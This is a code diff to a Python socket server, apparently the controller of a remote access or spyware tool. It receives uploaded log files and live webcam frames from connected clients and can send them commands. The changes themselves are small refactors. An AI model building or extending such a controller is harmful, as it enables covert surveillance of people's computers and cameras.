@@ -5,9 +5,9 @@ import os
 import socket
 import threading
 import time
-import dotenv
 
 import cv2
+import dotenv
 import numpy as np
 
 # Global variables
@@ -187,7 +187,6 @@ def handle_client(client_socket, client_address):
 
                 if data_command == 'LOG':
                     filename = client_info['filename']
-                    # parse filename
                     filename = filename.split('-')[1]
                     file_content = client_info['file_content']
                     file_content_bytes = base64.b64decode(file_content)
@@ -240,8 +239,12 @@ def handle_client(client_socket, client_address):
                     cv2.imshow(f"Webcam {client_address}", image)
 
                     if cv2.waitKey(1) & 0xFF == ord('q'):
-                        cv2.destroyWindow(f"Webcam {client_address}")
-                        break
+                        cv2.destroyAllWindows()
+                        client_info = {
+                            'command': 'WEBCAM'
+                        }
+                        json_data = json.dumps(client_info)
+                        client_socket.send(json_data.encode())
 
                 elif data_command == 'KILL':
                     stop = client_info['stop']
